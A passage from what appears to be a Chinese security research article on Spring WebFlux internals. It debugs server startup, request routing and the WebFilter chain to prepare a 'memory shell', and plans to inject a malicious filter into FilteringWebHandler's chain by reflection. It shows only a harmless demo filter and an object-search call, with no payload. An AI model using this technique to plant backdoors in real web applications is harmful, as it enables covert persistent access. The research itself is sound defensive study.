<p>发现里面有两个静态方法、一个<code>create</code>方法和一个默认实现 <code>DEFAULT</code>，这个默认实现通过加载 <code>ApplicationContextFactory</code> 的所有候选实现，创建相应的上下文；如果没有找到合适的实现，则默认返回一个 <code>AnnotationConfigApplicationContext</code> 实例。</p>
<p>我们继续<code>step over</code>走下去，可以看到我们<code>REACTIVE</code>对应的<code>context</code>是<code>AnnotationConfigReactiveWebServerApplicationContext</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002339-bfda1d28-c830-1.jpeg"/></p>
<p>继续往下走，我们会回到一开始这里，可以看到接下来会调用<code>prepareContext</code>、<code>refreshContext</code>和<code>afterRefresh</code>方法，这个过程就是一系列的初始化、监听的注册等操作：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002346-c419aade-c830-1.jpeg"/></p>
<p>我们<code>step into</code>这里的<code>refreshContext</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002350-c646eaa6-c830-1.jpeg"/></p>
<p>接着<code>step into</code>这里的<code>refresh</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002353-c83aee52-c830-1.jpeg"/></p>
<p>进来之后，接着<code>step into</code>这里的<code>refresh</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002355-c915eae8-c830-1.jpeg"/></p>
<p>可以看到，这里调用了一个<code>super.refresh</code>，也就是父类的<code>refresh</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002357-ca558a9e-c830-1.jpeg"/></p>
<p>我们继续<code>step into</code>查看，发现这里调用了<code>onRefresh</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002358-cb21e634-c830-1.jpeg"/></p>
<p>我们<code>step into</code>这里的<code>onRefresh</code>，发现它调用了关键的<code>org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext#createWebServer</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002400-cc2becf0-c830-1.jpeg"/></p>
<p>继续<code>step over</code>可以看到，由于我们使用的是<code>Netty</code>而不是<code>Tomcat</code>，因此这里最终会调用<code>NettyReactiveWebServerFactory</code>类中的<code>getWebServer</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002402-cd6d7f3e-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002404-ceacacee-c830-1.jpeg"/></p>
<p>而上图中的<code>WebServerManager</code>类也是一个重要的封装类，里面有两个成员变量，一个是底层服务器的抽象<code>WebServer</code>，另一个是上层方法处理者的抽象<code>DelayedInitializationHttpHandler</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002406-cf7f921c-c830-1.jpeg"/></p>
<p>那这个<code>webserver</code>具体是怎么启动的呢？我们继续走到<code>finishRefresh</code>这个方法这里来，如果这里我们直接无脑<code>step over</code>，程序最终会回到<code>run</code>方法，说明，启动<code>webserver</code>的地方肯定就在这个<code>finishRefresh</code>方法里面：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002407-d054c612-c830-1.jpeg"/></p>
<p>我们<code>step into</code>进去看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002408-d13525cc-c830-1.jpeg"/></p>
<p>接着<code>step into</code>去看看这里调用的<code>getLifecycleProcessor().onRefresh()</code>方法，发现调用了<code>startBeans</code>方法，并且设置了自启动：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002410-d200f5d0-c830-1.jpeg"/></p>
<p>我们直接<code>step into</code>这个<code>startBeans</code>方法，一步步地<code>step over</code>过后，会发现调用了<code>start</code>方法，看来我们在逐渐逼近真相：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002411-d2e2f656-c830-1.jpeg"/></p>
<p>我们继续<code>step into</code>这个<code>start</code>方法，发现调用了<code>org.springframework.context.support.DefaultLifecycleProcessor#doStart</code>这个方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002413-d3d91f18-c830-1.jpeg"/></p>
<p>直接<code>step into</code>进去看看，发现由于<code>dependenciesForBean</code>为[]，所以没有调用<code>doStart</code>方法，直接就是调用<code>bean.start()</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002414-d4bfb680-c830-1.jpeg"/></p>
<p>继续<code>step into</code>这个<code>start</code>方法看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002416-d5d6397c-c830-1.jpeg"/></p>
<p>怎么会啥也没有呢？奇了怪了，到底是哪里出了问题了呢？我在这一步愣住了，决定把之前打的断点取消，在如下俩图所示的位置打上断点重新调试，因为这两个方法是关键方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002420-d7f4c638-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002423-d9de50f4-c830-1.jpeg"/></p>
<p>调试了几遍之后发现是我疏忽了，这里的<code>this.lifecycleBeans</code>里面其实有三个，每调用一次<code>doStart</code>方法就会删掉一个：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002426-dbaa7a52-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002430-ddecfe3e-c830-1.jpeg"/></p>
<p>可以看到，我们刚才调用的是第一个<code>bean</code>的，所以当然没有启动<code>webserver</code>相关的方法了：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002433-dff289d8-c830-1.jpeg"/></p>
<p>我们一步步<code>step over</code>，当<code>memeber.name</code>为<code>webServerStartStop</code>时，我们再<code>step into</code>这个<code>doStart</code>方法里面的<code>bean.start()</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002436-e1e0d754-c830-1.jpeg"/></p>
<p>即可看到<code>this.weServerManager.start()</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002440-e43032c0-c830-1.jpeg"/></p>
<p>我们继续<code>step into</code>这个<code>start</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002501-f0c5a0e2-c830-1.jpeg"/></p>
<p>仔细看看上面红框中的代码，先是初始化<code>HttpHandler</code>，这个方法其实根据<code>lazyInit</code>的值的不同来决定何时初始化，如果<code>lazyInit</code>值为<code>true</code>，那么就等第一次请求到来时才真正初始化；如果为<code>false</code>，那么就在 <code>WebServerManager</code> 的 <code>start</code> 方法中调用 <code>initializeHandler</code> 直接初始化：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002508-f48ca14e-c830-1.jpeg"/></p>
<p>我们继续步入这里的<code>start</code>方法，发现其位置为<code>org.springframework.boot.web.embedded.netty.NettyWebServer#start</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002525-ff1e2a74-c830-1.jpeg"/></p>
<p>到这里才算真正明了，真正的<code>webServer</code>启动的关键方法是<code>org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002537-0637a858-c831-1.jpeg"/></p>
<p>从下面的<code>this.webServer</code>中也可以看到，绑定的是<code>0.0.0.0:9191</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002555-10edc660-c831-1.jpeg"/></p>
<h3 data-content="1" id="b647bca3d3d99e19a026526b0af13f67">2.12.4 Spring WebFlux请求处理过程分析</h3>
<p>当一个请求过来的时候，<code>Spring WebFlux</code>是如何进行处理的呢？</p>
<p>这里我们在<code>org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello</code>这里打上断点，然后进行调试，访问<code>http://127.0.0.1:9191/hello</code>触发<code>debug</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002609-18e5f55e-c831-1.jpeg"/></p>
<p>一步步地<code>step over</code>后来到<code>org.springframework.web.reactive.DispatcherHandler#invokeHandler</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002625-22a8c058-c831-1.jpeg"/></p>
<p><code>step into</code>之后可以看到是<code>org.springframework.web.reactive.DispatcherHandler#handle</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002630-25b9c0a8-c831-1.jpeg"/></p>
<p>解释上面代码中的<code>return</code>部分，首先检查<code>handlerMappings</code>是否为<code>null</code>，如果是，那就调用<code>createNotFoundError</code>方法返回一个表示未找到处理程序的<code>Mono</code>；接着通过<code>CorsUtils.isPreFlightRequest</code>方法检查是否为预检请求，如果是，那就调用<code>handlePreFlight</code>方法处理预检请求，如果不是预检请求且<code>handlerMappings</code>不为<code>null</code>，通过一系列的操作，获取到请求的<code>handler</code>，然后调用<code>invokeHandler</code>方法执行处理程序，再调用<code>handleResult</code>方法处理执行结果，最终返回一个表示处理完成的<code>Mono</code>。</p>
<p>左下角的<code>Threads &amp; Variables</code>这里，我们往下翻，可以看到在此之前是调用了一个<code>org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandler</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002637-2a075148-c831-1.jpeg"/></p>
<p>我们把之前的断点去掉，然后在该函数这里打上断点：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002659-36b7b7de-c831-1.jpeg"/></p>
<p>发现调用了<code>org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandlerInternal</code>，我们再回去看，发现调用位置在<code>org.springframework.web.reactive.function.server.support.RouterFunctionMapping#getHandlerInternal</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002700-37c40a38-c831-1.jpeg"/></p>
<p>点击去：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002702-38a6221a-c831-1.jpeg"/></p>
<p>这里最终创建的是<code>DefaultServerRequest</code>对象，需要注意的是在创建该对象时将<code>RouterFunctionMapping</code>中保存的<code>HttpMessageReader</code>列表作为参数传入，这样<code>DefaultServerRequest</code>对象就有了解析参数的能力。</p>
<p>回到<code>getHandlerInternal</code>这个函数，看它的<code>return</code>里面的匿名函数，发现其调用了<code>org.springframework.web.reactive.function.server.RouterFunction#route</code>，我们点进去看看：</p>
<p>发现只是在接口中定义了下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002704-39bf3538-c831-1.jpeg"/></p>
<p>于是去翻之前的<code>Threads &amp; Variables</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002705-3aaf2048-c831-1.jpeg"/></p>
<p>首先调用<code>this.predicate.test</code>方法来判断传入的<code>ServerRequest</code>是否符合路由要求，如果匹配到了处理方法，那就将保存的<code>HandlerFunction</code>实现返回，否则就返回空的<code>Mono</code>。</p>
<p>点进去这个<code>test</code>方法，发现还是个接口，结合之前的<code>RouterFunction.java</code>和<code>RouterFunctions.java</code>的命名规则，合理猜测<code>test</code>方法的实现应该是在<code>RequestPredicates.java</code>里面。果然是有的，我们取消之前下的所有断点，在<code>test</code>函数这里重新打上断点后调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002707-3b81c5ca-c831-1.jpeg"/></p>
<p>可以看到这里已经拿到了<code>pattern</code>，那就还差解析<code>request</code>里面的<code>GET</code>这个方法了：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002709-3ca940fe-c831-1.jpeg"/></p>
<p>我们继续<code>step over</code>，发现直接跳到了这里，我当时就挺纳闷儿，这里的<code>this.left</code>和<code>this.right</code>怎么就已知了：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002710-3d9280f2-c831-1.jpeg"/></p>
<p>这俩变量已知说明在执行<code>test</code>之前肯定是已经被赋值了，我继续往后<code>step over</code>，从下图中可以看到，此时二者之间多了个<code>&amp;&amp;</code>，不难猜测，应该是调用了<code>org.springframework.web.reactive.function.server.RequestPredicates.AndRequestPredicate</code>方法，因为还有一个<code>OrRequestPredicate</code>，这个<code>or</code>的话应该就是<code>||</code>了：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002712-3e723a4e-c831-1.jpeg"/></p>
<p>于是我们再在<code>AndRequestPredicate</code>方法这打上断点，此时我们还没有访问<code>http://127.0.0.1:9191/hello</code>，就已经触发调试了，这是因为我们在<code>GreetingRouter.java</code>里面写的代码中有<code>GET</code>方法、<code>/hello</code>路由还有<code>and</code>方法，因此会调用到<code>AndRequestPredicate</code>，并把<code>GET</code>和<code>/hello</code>分别复制给<code>this.left</code>和<code>this.right</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002713-3f56d2e4-c831-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002714-401dcda4-c831-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002716-4112a388-c831-1.jpeg"/></p>
<p>到这里，我们基本就了解了路由匹配这么个事情。接下来我们要考虑的事情就是如何处理请求，这个就比较简单了，为什么这么说呢？因为在我们<code>2.12.3</code>节中的分析中已经基本涉及到了。我们还是在<code>org.springframework.web.reactive.DispatcherHandler#invokeHandler</code>打下断点调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002718-420e5c1e-c831-1.jpeg"/></p>
<p>可以看到，这里的<code>this.handlerAdapters</code>里面有四个<code>handlerAdapter</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002719-430c021a-c831-1.jpeg"/></p>
<p>并不是所有的<code>handlerAdapter</code>都会触发<code>handle</code>方法，只有当支持我们给定的<code>handler</code>的<code>handlerAdapter</code>才可以调用：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002721-442c4c18-c831-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002723-451cba72-c831-1.jpeg"/></p>
<p>然后我们<code>step into</code>这里的<code>handlerAdapter.handle</code>方法，发现是在<code>org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002724-45fcb44c-c831-1.jpeg"/></p>
<p>而这里的<code>handlerFunction.handle</code>也就是我们编写的<code>route</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002726-470a6280-c831-1.jpeg"/></p>
<p>到这里，关于处理请求的部分也就完结了。</p>
<h3 data-content="1" id="8d2c49922d363e100b1f2eaac8045465">2.12.5 Spring WebFlux过滤器WebFilter运行过程分析</h3>
<p>对于<code>Spring WebFlux</code>而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用<code>Filter</code>，关于这一部分知识可以参考Spring的官方文档：</p>
<blockquote>
<p><a href="https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html" target="_blank">https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html</a></p>
</blockquote>
<p>而在<code>Spring Webflux</code>中，存在两种类型的过滤器：一个是<code>WebFilter</code>，实现自<code>org.springframework.web.server.WebFilter</code>接口。通过实现这个接口，可以定义全局的过滤器，它可以在请求被路由到<code>handler</code>之前或者之后执行一些逻辑；另一个就是<code>HandlerFilterFunction</code>，它是一种函数式编程的过滤器类型，实现自<code>org.springframework.web.reactive.function.server.HandlerFilterFunction</code>接口，与<code>WebFilter</code>相比它更加注重函数式编程的风格，可以用于处理基于路由的过滤逻辑。</p>
<p>这里我们以<code>WebFilter</code>为例，看看它的运行过程。新建一个<code>GreetingFilter.java</code>，代码如下：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.webfluxmemoryshelldemo.hello</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.http.server.reactive.ServerHttpRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Component</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.server.ServerWebExchange</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.server.WebFilter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.server.WebFilterChain</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.util.pattern.PathPattern</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.util.pattern.PathPatternParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">reactor.core.publisher.Mono</span><span class="o">;</span>

<span class="nd">@Component</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">GreetingFilter</span> <span class="kd">implements</span> <span class="n">WebFilter</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Mono</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;</span> <span class="nf">filter</span><span class="o">(</span><span class="n">ServerWebExchange</span> <span class="n">serverWebExchange</span><span class="o">,</span> <span class="n">WebFilterChain</span> <span class="n">webFilterChain</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">PathPattern</span> <span class="n">pattern</span><span class="o">=</span><span class="k">new</span> <span class="n">PathPatternParser</span><span class="o">().</span><span class="na">parse</span><span class="o">(</span><span class="s">"/hello/**"</span><span class="o">);</span>
        <span class="n">ServerHttpRequest</span> <span class="n">request</span><span class="o">=</span><span class="n">serverWebExchange</span><span class="o">.</span><span class="na">getRequest</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">pattern</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">pathWithinApplication</span><span class="o">())){</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"hello, this is our filter!"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">webFilterChain</span><span class="o">.</span><span class="na">filter</span><span class="o">(</span><span class="n">serverWebExchange</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>效果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002727-47c82c34-c831-1.jpeg"/></p>
<p>我们直接在<code>filter</code>函数这里下断点，进行调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002729-48bd1c58-c831-1.jpeg"/></p>
<p>注意到<code>return</code>中调用了<code>filter</code>函数，于是<code>step into</code>看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002731-49c10fce-c831-1.jpeg"/></p>
<p>可以看到是调用了<code>invokeFilter</code>函数。我们仔细看看这个<code>DefaultWebFilterChain</code>类：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002732-4ac82b78-c831-1.jpeg"/></p>
<p>可以看到是有三个名为<code>DefaultWebFilterChain</code>的函数，其中第一个是公共构造函数，第二个是私有构造函数（用来创建<code>chain</code>的中间节点），第三个是已经过时的构造函数。而在该类的注释中，有这样一句话：</p>
<blockquote>
<p>Each instance of this class represents one link in the chain. The public constructor DefaultWebFilterChain(WebHandler, List) initializes the full chain and represents its first link.</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002734-4bb36796-c831-1.jpeg"/></p>
</blockquote>
<p>也就是说，通过调用 <code>DefaultWebFilterChain</code> 类的公共构造函数，我们初始化了一个完整的过滤器链，其中的每个实例都代表链中的一个<code>link</code>，而不是一个<code>chain</code>，这就意味着我们无法通过修改下图中的<code>chain.allFilters</code>来实现新增<code>Filter</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002736-4cd1116e-c831-1.jpeg"/></p>
<p>但是这个类里面有个<code>initChain</code>方法用来初始化过滤器链，这个方法里面调用的是这个私有构造方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002738-4dd87ec6-c831-1.jpeg"/></p>
<p>那我们就看看这个公共构造方法是在哪里调用的：</p>
<p>光标移至该方法，按两下<code>Ctrl+Alt+F7</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002740-4f11b794-c831-1.jpeg"/></p>
<p>调用的地方位于<code>org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002741-501086b6-c831-1.jpeg"/></p>
<p>那思路就来了，我们只需要构造一个<code>DefaultWebFilterChain</code>对象，，然后把它通过反射写入到<code>FilteringWebHandler</code>类对象的<code>chain</code>属性中就可以了。</p>
<p>那现在就剩下传入<code>handler</code>和<code>filters</code>这两个参数了，这个<code>handler</code>参数很好搞，就在<code>chain</code>里面：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002743-511e51a0-c831-1.jpeg"/></p>
<p>然后这个<code>filters</code>的话，我们可以先获取到它本来的<code>filters</code>，然后把我们自己写的恶意<code>filter</code>放进去，放到第一位，就可以了。</p>
<p>那现在就是从内存中找到<code>DefaultWebFilterChain</code>的位置，然后一步步反射就行。这里直接使用工具<code>https://github.com/c0ny1/java-object-searcher</code>，克隆下来该项目，放到<code>idea</code>中<code>mvn clean install</code>：</p>
<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image/image-20240126134339217.png"/></p>
<p>然后把生成的这个<code>java-object-searcher-0.1.0.jar</code>放到我们的<code>WebFluxMemoryShellDemo</code>项目的Project <code>Structure</code>中的<code>Libraries</code>中：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002745-52325d5c-c831-1.jpeg"/></p>
<p>然后我们把我们的<code>GreetingFilter.java</code>的代码修改成下面的：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.webfluxmemoryshelldemo.hello</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.http.server.reactive.ServerHttpRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Component</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.server.ServerWebExchange</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.server.WebFilter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.server.WebFilterChain</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.util.pattern.PathPattern</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.util.pattern.PathPatternParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">reactor.core.publisher.Mono</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">me.gv7.tools.josearcher.entity.Blacklist</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">me.gv7.tools.josearcher.entity.Keyword</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">me.gv7.tools.josearcher.searcher.SearchRequstByBFS</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.ArrayList</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>

<span class="nd">@Component</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">GreetingFilter</span> <span class="kd">implements</span> <span class="n">WebFilter</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Mono</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;</span> <span class="nf">filter</span><span class="o">(</span><span class="n">ServerWebExchange</span> <span class="n">serverWebExchange</span><span class="o">,</span> <span class="n">WebFilterChain</span> <span class="n">webFilterChain</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">PathPattern</span> <span class="n">pattern</span><span class="o">=</span><span class="k">new</span> <span class="n">PathPatternParser</span><span class="o">().</span><span class="na">parse</span><span class="o">(</span><span class="s">"/hello/**"</span><span class="o">);</span>
        <span class="n">ServerHttpRequest</span> <span class="n">request</span><span class="o">=</span><span class="n">serverWebExchange</span><span class="o">.</span><span class="na">getRequest</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">pattern</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">pathWithinApplication</span><span class="o">())){</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"hello, this is our GreetingFilter!"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">List</span><span class="o">&lt;</span><span class="n">Keyword</span><span class="o">&gt;</span> <span class="n">keys</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
        <span class="n">keys</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">Keyword</span><span class="o">.</span><span class="na">Builder</span><span class="o">().</span><span class="na">setField_type</span><span class="o">(</span><span class="s">"DefaultWebFilterChain"</span><span class="o">).</span><span class="na">build</span><span class="o">());</span>
        <span class="n">List</span><span class="o">&lt;</span><span class="n">Blacklist</span><span class="o">&gt;</span> <span class="n">blacklists</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
        <span class="n">blacklists</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">Blacklist</span><span class="o">.</span><span class="na">Builder</span><span class="o">().</span><span class="na">setField_type</span><span class="o">(</span><span class="s">"java.io.File"</span><span class="o">).</span><span class="na">build</span><span class="o">());</span>
        <span class="n">SearchRequstByBFS</span> <span class="n">searcher</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SearchRequstByBFS</span><span class="o">(</span><span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">(),</span><span class="n">keys</span><span class="o">);</span>
        <span class="n">searcher</span><span class="o">.</span><span class="na">setBlacklists</span><span class="o">(</span><span class="n">blacklists</span><span class="o">);</span>
        <span class="n">searcher</span><span class="o">.</span><span class="na">setIs_debug</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">searcher</span><span class="o">.</span><span class="na">setMax_search_depth</span><span class="o">(</span><span class="mi">10</span><span class="o">);</span>
        <span class="n">searcher</span><span class="o">.</span><span class="na">setReport_save_path</span><span class="o">(</span><span class="s">"D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin"</span><span class="o">);</span>
        <span class="n">searcher</span><span class="o">.</span><span class="na">searchObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">webFilterChain</span><span class="o">.</span><span class="na">filter</span><span class="o">(</span><span class="n">serverWebExchange</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>这里我们设置的关键字是<code>DefaultWebFilterChain</code>，然后直接运行：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002746-5310a026-c831-1.jpeg"/></p>
<p>也就是说，位置是在：</p>
<pre><code>TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop} 
  ---&gt; group = {java.lang.ThreadGroup} 
   ---&gt; threads = {class [Ljava.lang.Thread;} 
    ---&gt; [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} 
     ---&gt; this$0 = {org.springframework.boot.web.embedded.netty.NettyWebServer} 
      ---&gt; handler = {org.springframework.http.server.reactive.ReactorHttpHandlerAdapter} 
       ---&gt; httpHandler = {org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler} 
        ---&gt; delegate = {org.springframework.web.server.adapter.HttpWebHandlerAdapter} 
         ---&gt; delegate = {org.springframework.web.server.handler.ExceptionHandlingWebHandler} 
           ---&gt; delegate = {org.springframework.web.server.handler.FilteringWebHandler} 
            ---&gt; chain = {org.springframework.web.server.handler.DefaultWebFilterChain}</code></pre>
</div>
</div>